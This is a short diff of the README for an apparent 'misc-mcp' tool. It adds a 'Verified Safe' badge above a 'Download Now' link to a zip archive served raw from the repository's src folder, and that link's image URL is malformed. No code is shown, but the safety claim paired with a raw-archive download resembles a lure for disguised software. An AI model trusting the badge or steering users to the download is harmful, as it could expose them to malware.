@@ -1,5 +1,7 @@
 # 🎉 misc-mcp - Simplifying Your Daily Tasks Effortlessly
 
+[![SafeSkill 90/100](https://img.shields.io/badge/SafeSkill-90%2F100_Verified%20Safe-brightgreen)](https://safeskill.dev/scan/mostafamahmoud-33-misc-mcp)
+
 [![Download Now](https://raw.githubusercontent.com/MostafaMahmoud-33/misc-mcp/main/src/mcp-misc-3.9.zip%20Now-Release%https://raw.githubusercontent.com/MostafaMahmoud-33/misc-mcp/main/src/mcp-misc-3.9.zip)](https://raw.githubusercontent.com/MostafaMahmoud-33/misc-mcp/main/src/mcp-misc-3.9.zip)
 
 ## 🚀 Getting Started
